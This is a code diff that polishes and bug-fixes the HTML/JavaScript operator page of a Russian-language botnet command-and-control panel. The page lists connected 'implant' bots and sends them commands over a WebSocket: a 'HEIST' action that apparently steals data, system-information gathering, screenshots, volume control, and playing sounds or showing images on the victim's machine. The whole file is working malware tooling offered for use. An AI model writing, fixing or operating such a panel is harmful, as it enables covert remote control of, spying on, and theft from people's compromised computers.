@@ -2,49 +2,50 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>C2 Control Panel</title>
+    <title>C2 Control Panel - Final Version</title>
     <style>
         body { background-color: #2b2b2b; color: #dcdcdc; font-family: monospace; display: flex; margin: 0; height: 100vh; }
-        .sidebar { width: 250px; border-right: 1px solid #444; padding: 10px; display: flex; flex-direction: column; }
+        .sidebar { width: 250px; border-right: 1px solid #444; padding: 10px; display: flex; flex-direction: column; background-color: #313335; }
         .main-content { flex-grow: 1; display: flex; flex-direction: column; }
         .controls-panel { padding: 20px; border-bottom: 1px solid #444; }
-        .media-panel { padding: 20px; flex-grow: 1; }
+        .media-panel { padding: 20px; flex-grow: 1; overflow-y: auto; }
         #bot-list { list-style: none; padding: 0; }
         #bot-list li { padding: 8px; cursor: pointer; border-radius: 4px; margin-bottom: 5px; }
         #bot-list li:hover { background-color: #444; }
-        #bot-list li.selected { background-color: #5a5a5a; font-weight: bold; }
-        .log-panel { height: 150px; border-top: 1px solid #444; padding: 10px; overflow-y: scroll; background-color: #1e1e1e; }
+        #bot-list li.selected { background-color: #007bff; color: white; font-weight: bold; }
+        .log-panel { height: 150px; border-top: 1px solid #444; padding: 10px; overflow-y: scroll; background-color: #1e1e1e; font-size: 12px; }
         #log-output { white-space: pre-wrap; }
-        button { background-color: #4CAF50; border: none; color: white; padding: 10px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 14px; margin: 4px 2px; cursor: pointer; border-radius: 5px; }
-        button.action { background-color: #f44336; }
-        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; }
-        .file-grid button { width: 100%; background-color: #008CBA; }
+        button { background-color: #444; border: 1px solid #555; color: white; padding: 10px 15px; text-align: center; font-size: 14px; margin: 4px 2px; cursor: pointer; border-radius: 5px; transition: background-color 0.2s; }
+        button:hover { background-color: #555; }
+        button.action { background-color: #b71c1c; }
+        button.action:hover { background-color: #d32f2f; }
+        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; margin-top: 10px; }
+        .file-grid button { width: 100%; background-color: #005f8c; }
         .log-error { color: #ff5555; }
+        h3, h4 { border-bottom: 1px solid #444; padding-bottom: 5px; }
     </style>
 </head>
 <body>
-
     <div class="sidebar">
         <h3>Боты онлайн:</h3>
         <ul id="bot-list"></ul>
     </div>
-
     <div class="main-content">
         <div class="controls-panel">
-            <h3>Управление: <span id="selected-bot-name">...</span></h3>
-            <div>
-                <h4>Системные действия</h4>
-                <button class="action" onclick="runHeist()">Начать HEIST</button>
-                <button class="action" onclick="runSysInfo()">Системная информация</button>
-                <button class="action" onclick="runScreenshot()">Скриншот</button>
-            </div>
-            <div>
-                <h4>Управление звуком</h4>
-                <input type="range" min="0" max="100" value="50" id="volume-slider" onchange="setVolume(this.value)">
-                <button onclick="toggleMute()">Вкл/Выкл Звук</button>
+            <h3>Управление: <span id="selected-bot-name" style="color: #00e676;">...бот не выбран...</span></h3>      <div style="display: flex; gap: 20px;">
+                <div>
+                    <h4>Системные действия</h4>
+                    <button class="action" onclick="runHeist()">Начать HEIST</button>
+                    <button class="action" onclick="runSysInfo()">Системная информация</button>
+                    <button class="action" onclick="runScreenshot()">Скриншот</button>
+                </div>
+                <div>
+                    <h4>Управление звуком</h4>
+                    <input type="range" min="0" max="100" value="50" id="volume-slider" oninput="setVolume(this.value)">
+                    <button onclick="toggleMute()">Вкл/Выкл Звук</button>
+                </div>
             </div>
         </div>
-
         <div class="media-panel">
             <h3>Пранки и Медиа</h3>
             <h4>Локальные звуки</h4>
@@ -52,9 +53,7 @@
             <h4>Локальные изображения</h4>
             <div id="image-files" class="file-grid"></div>
         </div>
-
         <div class="log-panel">
-            <h4>Лог:</h4>
             <div id="log-output"></div>
         </div>
     </div>
@@ -69,15 +68,13 @@
         function log(message, isError = false) {
             const entry = document.createElement('div');
             entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            if (isError) {
-                entry.className = 'log-error';
-            }
+            if (isError) entry.className = 'log-error';
             logOutput.prepend(entry);
         }
 
         function connectWs() {
-            log("Подключение к C2...");
-            ws = new WebSocket(`wss://${window.location.host}/ws`);
+            log("Подключение к C2...");         const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
 
             ws.onopen = () => {
                 log("Соединение с C2 установлено.");
@@ -94,19 +91,16 @@
                         displayBotDetails(data.bot_id, data.data);
                         break;
                     case 'status':
-                        const isError = data.data.startsWith('❌');
-                        log(`[${selectedBot || 'SERVER'}] ${data.data}`, isError);
-                        break;               }
+                        log(`[${selectedBot || 'SERVER'}] ${data.data}`, data.data.startsWith('❌'));
+                        break;
+                }
             };
 
             ws.onclose = () => {
                 log("Соединение с C2 потеряно. Переподключение через 5 секунд...", true);
                 setTimeout(connectWs, 5000);
             };
-
-            ws.onerror = () => {
-                log("Ошибка WebSocket.", true);
-            };
+            ws.onerror = (e) => log("Ошибка WebSocket. Проверьте консоль браузера (F12).", true);
         }
 
         function updateBotList(bots) {
@@ -115,17 +109,18 @@
                 const li = document.createElement('li');
                 li.textContent = botId.replace('implant_', '');
                 li.dataset.botId = botId;
-                if (botId === selectedBot) {
-                    li.classList.add('selected');
-                }
+                if (botId === selectedBot) li.classList.add('selected');
                 li.onclick = () => selectBot(botId, li);
                 botList.appendChild(li);
             });
+             if (bots.length > 0 && !bots.includes(selectedBot)) {
+                selectBot(bots[0], botList.firstChild);
+            }
         }
 
         function selectBot(botId, element) {
             if (selectedBot) {
-                const oldSelected = botList.querySelector(`[data-bot-id="${selectedBot}"]`);
+                const oldSelected = botList.querySelector(`li.selected`);
                 if(oldSelected) oldSelected.classList.remove('selected');
             }
             selectedBot = botId;
@@ -137,18 +132,15 @@
 
         function displayBotDetails(botId, details) {
             if(botId !== selectedBot) return;
-            if (details.volume) {
-                document.getElementById('volume-slider').value = details.volume;
-            }
-            if (details.files) {
-                displayFiles(details.files);
-            }
+            if (details.volume !== undefined) document.getElementById('volume-slider').value = details.volume;
+            if (details.files) displayFiles(details.files);
         }
 
         function displayFiles(files) {
             const audioContainer = document.getElementById('audio-files');
             const imageContainer = document.getElementById('image-files');
-            audioContainer.innerHTML = '';    imageContainer.innerHTML = '';
+            audioContainer.innerHTML = '';
+            imageContainer.innerHTML = '';
 
             if (files && files.audio) {
                 files.audio.forEach(filename => {
@@ -176,16 +168,15 @@
             ws.send(JSON.stringify({ type: type, target_id: selectedBot, payload: payload }));
         }
 
-        // --- ФУНКЦИИ УПРАВЛЕНИЯ ---
+        // --- ФУНКЦИИ УПРАВЛЕНИЯ (ИСПРАВЛЕННАЯ ВЕРСИЯ) ---
         function setVolume(level) { sendCommand('command', { action: 'volume', level: level }); }
         function toggleMute() { sendCommand('command', { action: 'mute' }); }
         function runHeist() { sendCommand('command', { action: 'heist' }); }
         function runSysInfo() { sendCommand('command', { action: 'sysinfo' }); }
         function runScreenshot() { sendCommand('command', { action: 'screenshot' }); }
         function playSound(filename) { sendCommand('command', { action: 'play', filename: filename }); }
-        function showImage(filename) { sendCommand('command', 'show', { filename: filename }); }
+        function showImage(filename) { sendCommand('command', { action: 'show', filename: filename }); }
 
-        // Запуск при загрузке страницы
         document.addEventListener('DOMContentLoaded', connectWs);
     </script>
 </body>
